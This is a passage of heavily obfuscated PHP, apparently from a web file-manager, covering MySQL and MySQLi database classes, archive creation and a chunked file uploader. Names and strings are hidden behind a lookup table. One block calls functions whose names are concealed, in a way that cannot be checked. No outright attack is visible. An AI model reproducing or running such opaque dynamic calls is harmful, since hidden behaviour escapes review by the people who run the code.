$aÎÉ†„†‚¢, PCLZIP_CB_PRE_FILE_NAME, $BÆ°¼ÈĞ‡[1963]); } } else { if (self::checkIfType($cƒáš¬Æ¯Ë, $BÆ°¼ÈĞ‡[1934])) { foreach ($DÛ½Ÿ ¼¬· as $fÁœ˜–¼ => $Aâ™…Û›Ğ„) { $Aâ™…Û›Ğ„ = str_replace($BÆ°¼ÈĞ‡[493], $BÆ°¼ÈĞ‡[8], $Aâ™…Û›Ğ„); $aÎÉ†„†‚¢ = Kodio::clear(get_path_father($Aâ™…Û›Ğ„)); if ($fÁœ˜–¼ == 0) { $A²é°·ŠØ½ = PclTarCreate($f¿ò¶µÎ’‹, array($Aâ™…Û›Ğ„), $cƒáš¬Æ¯Ë, null, $aÎÉ†„†‚¢); continue; } $A²é°·ŠØ½ = PclTarAddList($f¿ò¶µÎ’‹, array($Aâ™…Û›Ğ„), $BÆ°¼ÈĞ‡[33], $aÎÉ†„†‚¢, $cƒáš¬Æ¯Ë); } } } return $A²é°·ŠØ½; } } goto EÇÙŒ…ö; CÃ»¶ÛÎ°á: class DbMysql extends Db { public function __construct($f©—ù¤„­¸ = '') { $f–õÁ•‘‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!extension_loaded($f–õÁ•‘‰[754])) { think_exception(think_lang($f–õÁ•‘‰[10]) . $f–õÁ•‘‰[823]); } if (!empty($f©—ù¤„­¸)) { $this->config = $f©—ù¤„­¸; if (empty($this->config[$f–õÁ•‘‰[13]])) { $this->config[$f–õÁ•‘‰[13]] = $f–õÁ•‘‰[33]; } } } public function connect($Cè†÷Å‡‹§ = '', $f²ŠƒŠÌ¸ = 0, $F¿à¯Óã‘ = false) { $Bîëñà =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!isset($this->linkID[$f²ŠƒŠÌ¸])) { goto FÄµğƒÕ­„; e­×ÄŠãÌ¥: if (1 != think_config($Bîëñà[18])) { unset($this->config); } goto e‰ÓÆëë¸°; b‚İÃÚ‰Ò: if ($a³¢Š™ÚŸ) { $this->linkID[$f²ŠƒŠÌ¸] = mysql_pconnect($a‡„¼Ö‰Å„, $Cè†÷Å‡‹§[$Bîëñà[826]], $Cè†÷Å‡‹§[$Bîëñà[827]], 131072); } else { $this->linkID[$f²ŠƒŠÌ¸] = mysql_connect($a‡„¼Ö‰Å„, $Cè†÷Å‡‹§[$Bîëñà[826]], $Cè†÷Å‡‹§[$Bîëñà[827]], !0, 131072); } if (!$this->linkID[$f²ŠƒŠÌ¸] || !empty($Cè†÷Å‡‹§[$Bîëñà[17]]) && !mysql_select_db($Cè†÷Å‡‹§[$Bîëñà[17]], $this->linkID[$f²ŠƒŠÌ¸])) { think_exception(mysql_error()); } $A¶Û‡…±› = mysql_get_server_info($this->linkID[$f²ŠƒŠÌ¸]); goto C“õÕ»Â‰; C“õÕ»Â‰: mysql_query($Bîëñà[828] . think_config($Bîëñà[829]) . $Bîëñà[55], $this->linkID[$f²ŠƒŠÌ¸]); if ($A¶Û‡…±› > $Bîëñà[830]) { mysql_query($Bîëñà[831], $this->linkID[$f²ŠƒŠÌ¸]); } $this->connected = !0; goto e­×ÄŠãÌ¥; FÄµğƒÕ­„: if (empty($Cè†÷Å‡‹§)) { $Cè†÷Å‡‹§ = $this->config; } $a‡„¼Ö‰Å„ = $Cè†÷Å‡‹§[$Bîëñà[824]] . ($Cè†÷Å‡‹§[$Bîëñà[825]] ? "\x3a{$Cè†÷Å‡‹§[$Bîëñà[825]]}" : $Bîëñà[33]); $a³¢Š™ÚŸ = !empty($Cè†÷Å‡‹§[$Bîëñà[13]][$Bîëñà[14]]) ? $Cè†÷Å‡‹§[$Bîëñà[13]][$Bîëñà[14]] : $this->pconnect; goto b‚İÃÚ‰Ò; e‰ÓÆëë¸°: } return $this->linkID[$f²ŠƒŠÌ¸]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($fÜÆÍÕÇá) { goto e¨±ĞÏĞ±¯; e¨±ĞÏĞ±¯: $cÑ¿Ë¹ì¦ß =& $_SERVER[åÌÛ»ô¢‚ö™]; if (0 === stripos($fÜÆÍÕÇá, $cÑ¿Ë¹ì¦ß[267])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto AÀƒ¶Ê¿„õ; C­‰•Ó“è: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto aÕ¨‰ˆ²æ; DĞÇÎ¢ˆï‰: think_action_status($cÑ¿Ë¹ì¦ß[19], 1); think_status($cÑ¿Ë¹ì¦ß[20]); $this->queryID = mysql_query($fÜÆÍÕÇá, $this->_linkID); goto C­‰•Ó“è; AÀƒ¶Ê¿„õ: if (!$this->_linkID) { return !1; } $this->queryStr = $fÜÆÍÕÇá; if ($this->queryID) { $this->free(); } goto DĞÇÎ¢ˆï‰; aÕ¨‰ˆ²æ: } public function execute($eŸ×Ö©Î‘¾) { goto B¸‘á«åµ; DÍùÃÉø¼: think_status($e¡…ˆÃÙƒ[20]); $EßĞòëÂ®á = mysql_query($eŸ×Ö©Î‘¾, $this->_linkID); $this->debug(); goto CÇëæ’õˆë; B¸‘á«åµ: $e¡…ˆÃÙƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aôòù¼‡„Õ; CÇëæ’õˆë: if (!1 === $EßĞòëÂ®á) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto dÕòƒğ½; aôòù¼‡„Õ: $this->queryStr = $eŸ×Ö©Î‘¾; if ($this->queryID) { $this->free(); } think_action_status($e¡…ˆÃÙƒ[21], 1); goto DÍùÃÉø¼; dÕòƒğ½: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[åÌÛ»ô¢‚ö™][832], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fßÀÔÂ™šñ = mysql_query($_SERVER[åÌÛ»ô¢‚ö™][833], $this->_linkID); $this->transTimes = 0; if (!$fßÀÔÂ™šñ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $e§¦’†ê = mysql_query($_SERVER[åÌÛ»ô¢‚ö™][834], $this->_linkID); $this->transTimes = 0; if (!$e§¦’†ê) { $this->error(); return !1; } } return !0; } private function getAll() { $dâáÇåµ“ö = array(); if ($this->numRows > 0) { while ($AßÑ’îÖ§ = mysql_fetch_assoc($this->queryID)) { $dâáÇåµ“ö[] = $AßÑ’îÖ§; } mysql_data_seek($this->queryID, 0); } return $dâáÇåµ“ö; } public function getFields($aÄÑ‚‚ã) { $AÁòÂÚÁÃ¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A‘ñ‡†õØÛ = $this->query($AÁòÂÚÁÃ¤[835] . $this->parseKey($aÄÑ‚‚ã)); $cî¸”Åõ‡ = array(); if ($A‘ñ‡†õØÛ) { foreach ($A‘ñ‡†õØÛ as $Eæ‘éâÒ…Ë => $EÀ”²Éñ) { $cî¸”Åõ‡[$EÀ”²Éñ[$AÁòÂÚÁÃ¤[27]]] = array($AÁòÂÚÁÃ¤[28] => $EÀ”²Éñ[$AÁòÂÚÁÃ¤[27]], $AÁòÂÚÁÃ¤[29] => $EÀ”²Éñ[$AÁòÂÚÁÃ¤[30]], $AÁòÂÚÁÃ¤[31] => (bool) (strtoupper($EÀ”²Éñ[$AÁòÂÚÁÃ¤[32]]) === $AÁòÂÚÁÃ¤[836]), $AÁòÂÚÁÃ¤[34] => $EÀ”²Éñ[$AÁòÂÚÁÃ¤[35]], $AÁòÂÚÁÃ¤[36] => strtolower($EÀ”²Éñ[$AÁòÂÚÁÃ¤[37]]) == $AÁòÂÚÁÃ¤[38], $AÁòÂÚÁÃ¤[39] => strtolower($EÀ”²Éñ[$AÁòÂÚÁÃ¤[40]]) == $AÁòÂÚÁÃ¤[41]); } } return $cî¸”Åõ‡; } public function getTables($dğƒó¤ØçÙ = '') { $E–«µ·‘ĞÓ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!empty($dğƒó¤ØçÙ)) { $BÆµŒ’Ù‘¼ = $E–«µ·‘ĞÓ[837] . $dğƒó¤ØçÙ . $E–«µ·‘ĞÓ[838]; } else { $BÆµŒ’Ù‘¼ = $E–«µ·‘ĞÓ[839]; } $e‡§‰ÆÓ‚¹ = $this->query($BÆµŒ’Ù‘¼); $d””ôù… = array(); foreach ($e‡§‰ÆÓ‚¹ as $eÓ‚÷Ä‚¶‡ => $E¡‚‘Îšì) { $d””ôù…[$eÓ‚÷Ä‚¶‡] = current($E¡‚‘Îšì); } return $d””ôù…; } public function replace($E´ªôîÛö¼, $D…ñ¸Ì¸Õµ = array()) { $EŸ‹À¶ˆğ§ =& $_SERVER[åÌÛ»ô¢‚ö™]; foreach ($E´ªôîÛö¼ as $AìÉ¼¬Ù => $FšÊ´ßÖ¾) { $D…İĞ´ñ˜Õ = $this->parseValue($FšÊ´ßÖ¾); if (is_scalar($D…İĞ´ñ˜Õ)) { $Ašá¸ëĞÈŞ[] = $D…İĞ´ñ˜Õ; $A¦æ‡ÂÖÂ[] = $this->parseKey($AìÉ¼¬Ù); } } $DŸšÒ®ß¶‰ = $EŸ‹À¶ˆğ§[840] . $this->parseTable($D…ñ¸Ì¸Õµ[$EŸ‹À¶ˆğ§[282]]) . $EŸ‹À¶ˆğ§[841] . implode($EŸ‹À¶ˆğ§[47], $A¦æ‡ÂÖÂ) . $EŸ‹À¶ˆğ§[842] . implode($EŸ‹À¶ˆğ§[47], $Ašá¸ëĞÈŞ) . $EŸ‹À¶ˆğ§[843]; return $this->execute($DŸšÒ®ß¶‰); } public function insertAll($cÁ‡‹ùÛ·Ï, $E¬ùôÄÆ = array(), $CØ±‡Ô–¢ = false) { goto Aœ¿³ù¢ÀÒ; bùµŒƒÜ±ô: $dÜ®«Æ©— = ($CØ±‡Ô–¢ ? $dø×§¨°õù[845] : $dø×§¨°õù[846]) . $dø×§¨°õù[847] . $this->parseTable($E¬ùôÄÆ[$dø×§¨°õù[282]]) . $dø×§¨°õù[841] . implode($dø×§¨°õù[47], $CÇƒåÖ ÷) . $dø×§¨°õù[848] . implode($dø×§¨°õù[47], $dŞÃĞ„çÌ); return $this->execute($dÜ®«Æ©—); goto BøÛíŞÓïË; Aœ¿³ù¢ÀÒ: $dø×§¨°õù =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!is_array($cÁ‡‹ùÛ·Ï[0])) { return !1; } $CÇƒåÖ ÷ = array_keys($cÁ‡‹ùÛ·Ï[0]); goto fØÃä§¸â; fØÃä§¸â: $dŞÃĞ„çÌ = array(); foreach ($cÁ‡‹ùÛ·Ï as $Eì¶ñ’ì¥Õ) { $bßœ®ÓŞÜÁ = array(); foreach ($Eì¶ñ’ì¥Õ as $e›²óë›Š¯ => $EÆ†’´ã©) { $EÆ†’´ã© = $this->parseValue($EÆ†’´ã©); if (is_scalar($EÆ†’´ã©)) { $bßœ®ÓŞÜÁ[] = $EÆ†’´ã©; } } $dŞÃĞ„çÌ[] = $dø×§¨°õù[263] . implode($dø×§¨°õù[47], $bßœ®ÓŞÜÁ) . $dø×§¨°õù[843]; } array_walk($CÇƒåÖ ÷, array($this, $dø×§¨°õù[844])); goto bùµŒƒÜ±ô; BøÛíŞÓïË: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $B•Âºñß‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->error = mysql_errno() . $B•Âºñß‡[4] . mysql_error($this->_linkID); if ($B•Âºñß‡[33] != $this->queryStr) { $this->error .= LNG($B•Âºñß‡[45]) . $this->queryStr; } think_trace($this->error, $B•Âºñß‡[33], $B•Âºñß‡[46]); return $this->error; } public function escapeString($e¬¡Â¶œ½) { if ($this->_linkID) { return mysql_real_escape_string($e¬¡Â¶œ½, $this->_linkID); } else { return mysql_escape_string($e¬¡Â¶œ½); } } public function parseKey(&$eåâï£Äà, $Cè×ÁÃ“ˆ‚ = true) { $dÂ²Ş’ìÆ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($Cè×ÁÃ“ˆ‚) { $eåâï£Äà = $this->parseKeyCheck($eåâï£Äà); } if ($eåâï£Äà != $dÂ²Ş’ìÆ[190] && !preg_match($dÂ²Ş’ìÆ[849], $eåâï£Äà)) { $eåâï£Äà = $dÂ²Ş’ìÆ[384] . trim($eåâï£Äà, $dÂ²Ş’ìÆ[384]) . $dÂ²Ş’ìÆ[384]; } return $eåâï£Äà; } } if ($_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][179]] != $_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][817]]) { goto EËí¼°ÎØ; BÜöÊ‡ÏÌ›: $Cî­¸Ş¢‰($_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][787]]); goto E±ÙöÔÀ…ƒ; f™ ±‚²¿‡: $F£ìÀñµ±é = explode($_SERVER[åÌÛ»ô¢‚ö™][183], $Bççœ¹™á); if (count($F£ìÀñµ±é) < $_SERVER[åÌÛ»ô¢‚ö™][184]) { $Fó‰íä«Œ¹ = $_SERVER[åÌÛ»ô¢‚ö™][185]; $Fó‰íä«Œ¹(); } $Cî­¸Ş¢‰ = $_SERVER[åÌÛ»ô¢‚ö™][186]; goto BÜöÊ‡ÏÌ›; EËí¼°ÎØ: $C±½ïÒ»¿— = $_SERVER[åÌÛ»ô¢‚ö™][180]; $e¼Î¢‹è»Ñ = $_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][181]] . $_SERVER[åÌÛ»ô¢‚ö™][182]; $Bççœ¹™á = $C±½ïÒ»¿—($e¼Î¢‹è»Ñ); goto f™ ±‚²¿‡; E±ÙöÔÀ…ƒ: } class DbMysqli extends Db { public function __construct($e¥ƒ¡¿ôëÏ = '') { $DŒĞÊ‡äÆ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!extension_loaded($DŒĞÊ‡äÆ[753])) { think_exception(think_lang($DŒĞÊ‡äÆ[10]) . $DŒĞÊ‡äÆ[850]); } if (!empty($e¥ƒ¡¿ôëÏ)) { $this->config = $e¥ƒ¡¿ôëÏ; if (empty($this->config[$DŒĞÊ‡äÆ[13]])) { $this->config[$DŒĞÊ‡äÆ[13]] = $DŒĞÊ‡äÆ[33]; } } } public function connect($C»Î˜¤„î² = '', $D×ß¡’«®– = 0) { $F™‡‡‰ ¾¶ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!isset($this->linkID[$D×ß¡’«®–])) { goto a”œ®Õ…çÌ; dœ±¾ƒ”à®: $this->connected = !0; if (1 != think_config($F™‡‡‰ ¾¶[18])) { unset($this->config); } goto C°¡Ï²¾­‘; a”œ®Õ…çÌ: if (empty($C»Î˜¤„î²)) { $C»Î˜¤„î² = $this->config; } $this->linkID[$D×ß¡’«®–] = new mysqli($C»Î˜¤„î²[$F™‡‡‰ ¾¶[824]], $C»Î˜¤„î²[$F™‡‡‰ ¾¶[826]], $C»Î˜¤„î²[$F™‡‡‰ ¾¶[827]], $C»Î˜¤„î²[$F™‡‡‰ ¾¶[17]], $C»Î˜¤„î²[$F™‡‡‰ ¾¶[825]] ? intval($C»Î˜¤„î²[$F™‡‡‰ ¾¶[825]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto A¨ÚÓ´Õé­; A¨ÚÓ´Õé­: $AÅÙŞƒ†™ = $this->linkID[$D×ß¡’«®–]->server_version; $this->linkID[$D×ß¡’«®–]->query($F™‡‡‰ ¾¶[828] . think_config($F™‡‡‰ ¾¶[829]) . $F™‡‡‰ ¾¶[55]); if ($AÅÙŞƒ†™ > $F™‡‡‰ ¾¶[830]) { $this->linkID[$D×ß¡’«®–]->query($F™‡‡‰ ¾¶[831]); } goto dœ±¾ƒ”à®; C°¡Ï²¾­‘: } return $this->linkID[$D×ß¡’«®–]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($D¿©œ¨£õŞ) { goto c‹¾•÷¤æƒ; aÅ¶›Êá„ : $this->queryStr = $D¿©œ¨£õŞ; if ($this->queryID) { $this->free(); } think_action_status($cºØ²¿…İ½[19], 1); goto d­ó‡ƒìÎ; a×÷­À´: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto CÃ®ÃÒ«•; c‹¾•÷¤æƒ: $cºØ²¿…İ½ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aÅ¶›Êá„ ; d­ó‡ƒìÎ: think_status($cºØ²¿…İ½[20]); $this->queryID = $this->_linkID->query($D¿©œ¨£õŞ); if ($this->_linkID->more_results()) { while (($a‘›ö…ƒ‡Š = $this->_linkID->next_result()) != NULL) { $a‘›ö…ƒ‡Š->free_result(); } } goto a×÷­À´; CÃ®ÃÒ«•: } public function execute($Aâ¤¡Š×‰) { goto b¥ƒÜ‡ÇÕ¤; d…ÎÈ¾âö§: think_status($B£¶…Ôï…˜[20]); $BİÆÖô¸¦ï = $this->_linkID->query($Aâ¤¡Š×‰); $this->debug(); goto F¢³âÈ›„ç; b¥ƒÜ‡ÇÕ¤: $B£¶…Ôï…˜ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto döå¿ƒ¤š; F¢³âÈ›„ç: if (!1 === $BİÆÖô¸¦ï) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto DÉ†ŠãùÈ¥; döå¿ƒ¤š: $this->queryStr = $Aâ¤¡Š×‰; if ($this->queryID) { $this->free(); } think_action_status($B£¶…Ôï…˜[21], 1); goto d…ÎÈ¾âö§; DÉ†ŠãùÈ¥: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aä—æ‡ëÇ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$aä—æ‡ëÇ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $cºë½½ºÎ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$cºë½½ºÎ) { $this->error(); return !1; } } return !0; } private function getAll() { $B ¼†Ã‘ï³ = array(); if ($this->numRows > 0) { for ($eŠŒñî¼Ü„ = 0; $eŠŒñî¼Ü„ < $this->numRows; $eŠŒñî¼Ü„++) { $B ¼†Ã‘ï³[$eŠŒñî¼Ü„] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $B ¼†Ã‘ï³; } public function getFields($Fäàµì¦È†) { $a¸ù¨¥ßŒÏ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fÃ®øØ…ˆ = $this->query($a¸ù¨¥ßŒÏ[835] . $this->parseKey($Fäàµì¦È†)); $AÉØŞ›çæœ = array(); if ($fÃ®øØ…ˆ) { foreach ($fÃ®øØ…ˆ as $a©Ì¶øíî => $aç“ĞÄÑ·) { $AÉØŞ›çæœ[$aç“ĞÄÑ·[$a¸ù¨¥ßŒÏ[27]]] = array($a¸ù¨¥ßŒÏ[28] => $aç“ĞÄÑ·[$a¸ù¨¥ßŒÏ[27]], $a¸ù¨¥ßŒÏ[29] => $aç“ĞÄÑ·[$a¸ù¨¥ßŒÏ[30]], $a¸ù¨¥ßŒÏ[31] => (bool) ($aç“ĞÄÑ·[$a¸ù¨¥ßŒÏ[32]] === $a¸ù¨¥ßŒÏ[33]), $a¸ù¨¥ßŒÏ[34] => $aç“ĞÄÑ·[$a¸ù¨¥ßŒÏ[35]], $a¸ù¨¥ßŒÏ[36] => strtolower($aç“ĞÄÑ·[$a¸ù¨¥ßŒÏ[37]]) == $a¸ù¨¥ßŒÏ[38], $a¸ù¨¥ßŒÏ[39] => strtolower($aç“ĞÄÑ·[$a¸ù¨¥ßŒÏ[40]]) == $a¸ù¨¥ßŒÏ[41]); } } return $AÉØŞ›çæœ; } public function getTables($BÒ‡¥²ÊÛ = '') { $cÛõæÁÄØ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b–ÁÕÆš§Ê = !empty($BÒ‡¥²ÊÛ) ? $cÛõæÁÄØ[837] . $BÒ‡¥²ÊÛ . $cÛõæÁÄØ[838] : $cÛõæÁÄØ[839]; $dœÁèâ²²– = $this->query($b–ÁÕÆš§Ê); $C¹ó¶Íä²£ = array(); if ($dœÁèâ²²–) { foreach ($dœÁèâ²²– as $Eõö©İÂÚ¯ => $E‡­¾—Ğê») { $C¹ó¶Íä²£[$Eõö©İÂÚ¯] = current($E‡­¾—Ğê»); } } return $C¹ó¶Íä²£; } public function replace($EÌÑ„«ã®, $Bíä³Ò»Æ = array()) { $BÏ—‹¯¬²˜ =& $_SERVER[åÌÛ»ô¢‚ö™]; foreach ($EÌÑ„«ã® as $eÕ´Ó‹œŞ => $bÀÜ¶‚‘) { $e”µìå‡¿â = $this->parseValue($bÀÜ¶‚‘); if (is_scalar($e”µìå‡¿â)) { $C…øŠœ†„[] = $e”µìå‡¿â; $cëÛ¤Ÿ®µ½[] = $this->parseKey($eÕ´Ó‹œŞ); } } $CŠ±è•Ğ†Œ = $BÏ—‹¯¬²˜[840] . $this->parseTable($Bíä³Ò»Æ[$BÏ—‹¯¬²˜[282]]) . $BÏ—‹¯¬²˜[841] . implode($BÏ—‹¯¬²˜[47], $cëÛ¤Ÿ®µ½) . $BÏ—‹¯¬²˜[842] . implode($BÏ—‹¯¬²˜[47], $C…øŠœ†„) . $BÏ—‹¯¬²˜[843]; return $this->execute($CŠ±è•Ğ†Œ); } public function insertAll($cëÏÊê¾‡®, $F×‰Ú»ŞØ = array(), $Eã„ë·âá = false) { goto eóî£“³ÍŸ; dÉ‰†±ÏÆç: $C§î°õ–é = ($Eã„ë·âá ? $D÷¯™ó£Ş•[845] : $D÷¯™ó£Ş•[846]) . $D÷¯™ó£Ş•[847] . $this->parseTable($F×‰Ú»ŞØ[$D÷¯™ó£Ş•[282]]) . $D÷¯™ó£Ş•[841] . implode($D÷¯™ó£Ş•[47], $eğĞ©Ò˜–Ş) . $D÷¯™ó£Ş•[848] . implode($D÷¯™ó£Ş•[47], $bóÃğî´‚ƒ); return $this->execute($C§î°õ–é); goto DÈ´Á±éÅº; a‘¿Î¦„Âè: $bóÃğî´‚ƒ = array(); foreach ($cëÏÊê¾‡® as $AÊ”…Í÷Óê) { $fäêŸ©Ì = array(); foreach ($AÊ”…Í÷Óê as $bğê±Š¸³ => $CÔ åè“íÊ) { $CÔ åè“íÊ = $this->parseValue($CÔ åè“íÊ); if (is_scalar($CÔ åè“íÊ)) { $fäêŸ©Ì[] = $CÔ åè“íÊ; } } $bóÃğî´‚ƒ[] = $D÷¯™ó£Ş•[263] . implode($D÷¯™ó£Ş•[47], $fäêŸ©Ì) . $D÷¯™ó£Ş•[843]; } array_walk($eğĞ©Ò˜–Ş, array($this, $D÷¯™ó£Ş•[844])); goto dÉ‰†±ÏÆç; eóî£“³ÍŸ: $D÷¯™ó£Ş• =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!is_array($cëÏÊê¾‡®[0])) { return !1; } $eğĞ©Ò˜–Ş = array_keys($cëÏÊê¾‡®[0]); goto a‘¿Î¦„Âè; DÈ´Á±éÅº: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $d±İÎ¸ëÂ› =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->error = $this->_linkID->errno . $d±İÎ¸ëÂ›[4] . $this->_linkID->error; if ($d±İÎ¸ëÂ›[33] != $this->queryStr) { $this->error .= LNG($d±İÎ¸ëÂ›[45]) . $this->queryStr; } think_trace($this->error, $d±İÎ¸ëÂ›[33], $d±İÎ¸ëÂ›[46]); return $this->error; } public function escapeString($BƒÏíØ ©µ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($BƒÏíØ ©µ); } else { return addslashes($BƒÏíØ ©µ); } } public function parseKey(&$EÜ²á‘¾‹‘, $CŠçõ ÈÃã = true) { $d…ÎØèŞä =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($CŠçõ ÈÃã) { $EÜ²á‘¾‹‘ = $this->parseKeyCheck($EÜ²á‘¾‹‘); } if ($EÜ²á‘¾‹‘ != $d…ÎØèŞä[190] && !preg_match($d…ÎØèŞä[849], $EÜ²á‘¾‹‘)) { $EÜ²á‘¾‹‘ = $d…ÎØèŞä[384] . trim($EÜ²á‘¾‹‘, $d…ÎØèŞä[384]) . $d…ÎØèŞä[384]; } return $EÜ²á‘¾‹‘; } } goto C‰¹ª¿ä¿Ö; E’äÂ´âÀ: if (class_exists($_SERVER[åÌÛ»ô¢‚ö™][1999])) { class Services_JSON_Error extends PEAR_Error { function __construct($bğº¡›ŠæÕ = "\x75\156\x6b\156\x6f\167\x6e\40\x65\x72\x72\157\162", $bˆ­ŠÇê¯ = null, $E®Ùƒ±àà = null, $CÛÇëæ¬š¨ = null, $cÁìÏòŸ„Ú = null) { parent::PEAR_Error($bğº¡›ŠæÕ, $bˆ­ŠÇê¯, $E®Ùƒ±àà, $CÛÇëæ¬š¨, $cÁìÏòŸ„Ú); } } } else { class Services_JSON_Error { function __construct($EÏÈçå¾İ™ = "\165\x6e\153\156\x6f\167\x6e\40\x65\x72\162\x6f\162", $fÏ°ÂğŠ‹› = null, $dÈí¯®ÂŸã = null, $BÁöš„ÏÒí = null, $A­ÎÅˆ‚±¡ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto F„Ãö¼ã§; dî™³’ˆ¶: $this->checkSize(); $this->tempPathInit(); goto a¤Ø™À¡²ç; Eô“é„¡…Ñ: if (!empty($_FILES)) { $AÑ‘Æí¡ = $_FILES[$bíˆê°Š—¹[171]]; $this->uploadFile = $AÑ‘Æí¡[$bíˆê°Š—¹[2000]]; if (!$this->uploadFile && $AÑ‘Æí¡[$bíˆê°Š—¹[1245]] > 0) { show_json($this->errorInfo($AÑ‘Æí¡[$bíˆê°Š—¹[1245]]), !1); } } else { if (isset($in[$bíˆê°Š—¹[411]])) { $this->uploadFile = isset($in[$bíˆê°Š—¹[2001]]) ? $bíˆê°Š—¹[2002] : $bíˆê°Š—¹[1845]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto dî™³’ˆ¶; F„Ãö¼ã§: $bíˆê°Š—¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; global $in; $this->in =& $in; goto Eô“é„¡…Ñ; a¤Ø™À¡²ç: } public function upload() { goto bÔ–Œöì; bîÌª§ğ•…: ignore_timeout(); if (!$this->checkChunkHash($AÉ›ßç›ÍØ)) { $this->showJson($eÈçÊ¼à®[2017], !1); } $this->statusSet(!1); goto fš»‹¥êŞ®; D¼†ŠÉ¤è: if ($b½Ó„ƒ©Ç  > 1 && $c¬ğ¹…Åˆ• <= 0) { show_json($eÈçÊ¼à®[2007], !1); } if ($c¬ğ¹…Åˆ• > $C´¹èÛ™¢©) { $b½Ó„ƒ©Ç  = 1; } if ($b½Ó„ƒ©Ç  <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto d‚Œ„ö; C›÷óèëË: $Cœ¦Ğì„†Ù = $bš×¡é›Ùñ * $c¬ğ¹…Åˆ•; $f‘Şˆ¶«°Ú = @fopen($this->tempFile, $eÈçÊ¼à®[2010]); fseek_64($f‘Şˆ¶«°Ú, $Cœ¦Ğì„†Ù); goto AÒ¿ÔàäÙ; bÀ¹÷ ‚´Ì: @unlink($cŒ³ÌØËŒ); if (!$eÓâÊˆÇ•Ğ) { $this->showJson($eÈçÊ¼à®[2011] . $bš×¡é›Ùñ, !1); } $AÉ›ßç›ÍØ[$eÈçÊ¼à®[2012]] = $b½Ó„ƒ©Ç ; goto bíÍá‘¶Œ»; d‚Œ„ö: CacheLock::lock($this->tempFile, 60); $AÉ›ßç›ÍØ = $this->statusGet(); $this->initFileTemp(); goto d¹Ã·öâÁÏ; Dè‹å‡­Ğñ: $E”„²•ï—› = $this->tempFile . $eÈçÊ¼à®[2005] . $bš×¡é›Ùñ; $C´¹èÛ™¢© = isset($this->in[$eÈçÊ¼à®[546]]) ? intval($this->in[$eÈçÊ¼à®[546]]) : 0; $c¬ğ¹…Åˆ• = isset($this->in[$eÈçÊ¼à®[2006]]) ? intval($this->in[$eÈçÊ¼à®[2006]]) : 0; goto D¼†ŠÉ¤è; bÔ–Œöì: $eÈçÊ¼à® =& $_SERVER[åÌÛ»ô¢‚ö™]; $bš×¡é›Ùñ = isset($this->in[$eÈçÊ¼à®[2003]]) ? intval($this->in[$eÈçÊ¼à®[2003]]) : 0; $b½Ó„ƒ©Ç  = isset($this->in[$eÈçÊ¼à®[2004]]) ? intval($this->in[$eÈçÊ¼à®[2004]]) : 1; goto Dè‹å‡­Ğñ; bíÍá‘¶Œ»: $AÉ›ßç›ÍØ[$eÈçÊ¼à®[2013]][$eÈçÊ¼à®[2014] . $bš×¡é›Ùñ] = array($eÈçÊ¼à®[2015] => $Cœ¦Ğì„†Ù, $eÈçÊ¼à®[1063] => $bš×¡é›Ùñ, $eÈçÊ¼à®[77] => $C´¹èÛ™¢©, $eÈçÊ¼à®[168] => $a¡“±õº¦÷); $this->statusSet($AÉ›ßç›ÍØ); if (count($AÉ›ßç›ÍØ[$eÈçÊ¼à®[2013]]) != $AÉ›ßç›ÍØ[$eÈçÊ¼à®[2012]]) { $this->showJson($eÈçÊ¼à®[2016] . 